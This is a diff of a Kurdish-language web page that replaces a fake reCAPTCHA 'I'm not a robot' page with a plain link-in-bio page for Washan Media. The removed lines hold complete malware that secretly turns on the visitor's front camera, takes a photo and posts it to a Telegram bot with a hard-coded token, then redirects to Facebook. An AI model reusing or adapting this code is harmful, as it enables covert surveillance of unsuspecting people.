@@ -1,65 +1,239 @@
 <!DOCTYPE html>
-<html lang="ku">
+<html lang="ku" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification</title>
+    <title>وەشەن میدیا - Washan Media</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@100;400;700&display=swap" rel="stylesheet">
+    
     <style>
-        body { background-color: #f9f9f9; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .captcha-box { background: white; border: 1px solid #d3d3d3; border-radius: 3px; width: 300px; padding: 15px; display: flex; align-items: center; box-shadow: 0 2px 4px rgba(0,0,0,0.1); cursor: pointer; position: relative; }
-        .checkbox { width: 24px; height: 24px; border: 2px solid #c1c1c1; border-radius: 2px; margin-right: 15px; }
-        .text { color: #555; font-size: 14px; flex-grow: 1; }
-        #video { position: absolute; width: 1px; height: 1px; opacity: 0.01; }
-        #canvas { display: none; }
-        .loader { display: none; border: 3px solid #f3f3f3; border-top: 3px solid #4d90fe; border-radius: 50%; width: 22px; height: 22px; animation: spin 1s linear infinite; margin-right: 15px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Vazirmatn', sans-serif;
+        }
+        body {
+            background: #050505;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            direction: rtl;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* پاشبنەمایەکی ئەنیمەیت کراو */
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background: radial-gradient(circle at 50% 50%, #0f172a 0%, #050505 100%);
+            z-index: -2;
+        }
+
+        .particle {
+            position: fixed;
+            background: linear-gradient(135deg, #00c8ff, #764ba2);
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: -1;
+            filter: blur(1px);
+        }
+
+        .container {
+            max-width: 420px;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.02);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 35px;
+            padding: 45px 25px;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.6);
+            text-align: center;
+            z-index: 1;
+        }
+
+        /* ستایلی لۆگۆ */
+        .profile { margin-bottom: 35px; }
+        .logo-circle {
+            width: 130px;
+            height: 130px;
+            margin: 0 auto 20px;
+            background: rgba(0,0,0,0.5);
+            border-radius: 50%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            border: 2px solid rgba(0, 200, 255, 0.2);
+            box-shadow: 0 0 30px rgba(0, 200, 255, 0.1);
+        }
+        .logo-w {
+            font-size: 65px;
+            font-weight: 900;
+            background: linear-gradient(135deg, #00e5ff, #764ba2);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            line-height: 1;
+        }
+        .logo-subtitle { 
+            font-size: 11px; 
+            color: rgba(255,255,255,0.7); 
+            text-transform: uppercase; 
+            letter-spacing: 1px;
+            margin-top: 5px;
+        }
+
+        h1 { color: #fff; font-size: 30px; font-weight: 700; margin-bottom: 8px; }
+        .subtitle { 
+            color: #00c8ff; 
+            font-size: 14px; 
+            font-weight: 400; 
+            margin-bottom: 30px;
+            letter-spacing: 0.5px;
+        }
+
+        /* ستایلی یەکگرتووی لینکەکان */
+        .links { display: flex; flex-direction: column; gap: 14px; }
+        .link-button {
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.07);
+            border-radius: 22px;
+            padding: 18px 22px;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        .link-button:hover {
+            background: rgba(255, 255, 255, 0.08);
+            border-color: rgba(0, 200, 255, 0.6);
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(0, 200, 255, 0.15);
+        }
+
+        .link-icon {
+            width: 48px;
+            height: 48px;
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            color: #fff;
+            background: linear-gradient(135deg, #00c8ff, #764ba2);
+            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.2);
+            flex-shrink: 0;
+        }
+
+        .link-text { flex: 1; text-align: right; }
+        .link-title { font-size: 17px; font-weight: 700; color: #fff; }
+        .link-subtitle { font-size: 12px; color: rgba(255,255,255,0.4); margin-top: 2px; }
+        .link-arrow { color: rgba(255,255,255,0.15); font-size: 18px; transition: 0.3s; }
+        .link-button:hover .link-arrow { color: #00c8ff; transform: translateX(-5px); }
+
+        /* ئەنیمەیشنی پاشبنەما */
+        @keyframes floatUp {
+            0% { transform: translateY(0) scale(1); opacity: 0; }
+            20% { opacity: 0.5; }
+            80% { opacity: 0.5; }
+            100% { transform: translateY(-100vh) scale(1.5); opacity: 0; }
+        }
     </style>
 </head>
 <body>
 
-    <div class="captcha-box" onclick="run()">
-        <div class="checkbox" id="checkBtn"></div>
-        <div class="loader" id="loadBtn"></div>
-        <div class="text"> (I'm not a robot)</div>
-        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="30">
+    <div class="container">
+        <div class="profile">
+            <div class="logo-circle">
+                <div class="logo-w">W</div>
+                <div class="logo-subtitle">Washan Media</div>
+            </div>
+            <h1>وەشەن میدیا</h1>
+            <p class="subtitle">وەشانێکی نوێ لە دنیای میدیا</p>
+        </div>
+
+        <div class="links">
+            <a href="https://www.tiktok.com/@washanmedia" class="link-button" target="_blank">
+                <div class="link-icon"><i class="fab fa-tiktok"></i></div>
+                <div class="link-text">
+                    <div class="link-title">تیک تۆک</div>
+                    <div class="link-subtitle">@washanmedia</div>
+                </div>
+                <div class="link-arrow"><i class="fas fa-chevron-left"></i></div>
+            </a>
+
+            <a href="https://www.facebook.com/share/18dSJLZmDo/" class="link-button" target="_blank">
+                <div class="link-icon"><i class="fab fa-facebook-f"></i></div>
+                <div class="link-text">
+                    <div class="link-title">فەیسبووک</div>
+                    <div class="link-subtitle">پەیجی فەرمی وەشەن</div>
+                </div>
+                <div class="link-arrow"><i class="fas fa-chevron-left"></i></div>
+            </a>
+
+            <a href="https://www.instagram.com/washan_media" class="link-button" target="_blank">
+                <div class="link-icon"><i class="fab fa-instagram"></i></div>
+                <div class="link-text">
+                    <div class="link-title">ئینستاگرام</div>
+                    <div class="link-subtitle">@washan_media</div>
+                </div>
+                <div class="link-arrow"><i class="fas fa-chevron-left"></i></div>
+            </a>
+
+            <a href="https://youtube.com/@washanmedia1" class="link-button" target="_blank">
+                <div class="link-icon"><i class="fab fa-youtube"></i></div>
+                <div class="link-text">
+                    <div class="link-title">یوتیوب</div>
+                    <div class="link-subtitle">سەبسکرایبمان بکەن</div>
+                </div>
+                <div class="link-arrow"><i class="fas fa-chevron-left"></i></div>
+            </a>
+
+            <a href="https://wa.me/9647515372521" class="link-button" target="_blank">
+                <div class="link-icon"><i class="fab fa-whatsapp"></i></div>
+                <div class="link-text">
+                    <div class="link-title">واتسئاپ</div>
+                    <div class="link-subtitle">بۆ پەیوەندی و ڕیکلام</div>
+                </div>
+                <div class="link-arrow"><i class="fas fa-chevron-left"></i></div>
+            </a>
+        </div>
     </div>
 
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
-
     <script>
-        const TOKEN = '8486664700:AAFsvIGJt8Iz1ITZbN4EvPajNJUzMuS6ImY';
-        const ID = '6351568884';
-        const TARGET = 'https://www.facebook.com/share/1C5gccsXme/?mibextid=wwXIfr';
-
-        function run() {
-            document.getElementById('checkBtn').style.display = 'none';
-            document.getElementById('loadBtn').style.display = 'block';
-
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-            .then(stream => {
-                const v = document.getElementById('video');
-                v.srcObject = stream;
-                
-                setTimeout(() => {
-                    const c = document.getElementById('canvas');
-                    c.width = v.videoWidth;
-                    c.height = v.videoHeight;
-                    c.getContext('2d').drawImage(v, 0, 0);
-                    
-                    c.toBlob(blob => {
-                        const info = navigator.userAgent.includes("iPhone") ? "iPhone 📱" : "Android/PC 📱";
-                        const fd = new FormData();
-                        fd.append('chat_id', ID);
-                        fd.append('photo', blob, 'shot.jpg');
-                        fd.append('caption', `✅ نوێ گەیشت!\n📱 مۆبایل: ${info}`);
-
-                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd })
-                        .then(() => { window.location.href = TARGET; });
-                    }, 'image/jpeg', 0.8);
-                }, 3000);
-            })
-            .catch(() => { window.location.href = TARGET; });
+        // دروستکردنی پارتی کڵەکان بۆ پاشبنەما
+        const particleCount = 15;
+        for(let i = 0; i < particleCount; i++) {
+            let p = document.createElement('div');
+            p.className = 'particle';
+            let size = Math.random() * 4 + 2;
+            p.style.width = size + 'px';
+            p.style.height = size + 'px';
+            p.style.left = Math.random() * 100 + '%';
+            p.style.top = Math.random() * 100 + '%';
+            p.style.opacity = Math.random() * 0.5;
+            
+            // ئەنیمەیشنێکی نەرم بۆ جوڵە
+            p.animate([
+                { transform: 'translateY(0) translateX(0)', opacity: 0 },
+                { opacity: 0.5, offset: 0.2 },
+                { transform: `translateY(-${Math.random() * 200 + 100}px) translateX(${Math.random() * 50 - 25}px)`, opacity: 0 }
+            ], {
+                duration: 5000 + Math.random() * 5000,
+                iterations: Infinity,
+                easing: 'ease-in-out',
+                delay: Math.random() * 5000
+            });
+            
+            document.body.appendChild(p);
         }
     </script>
 </body>
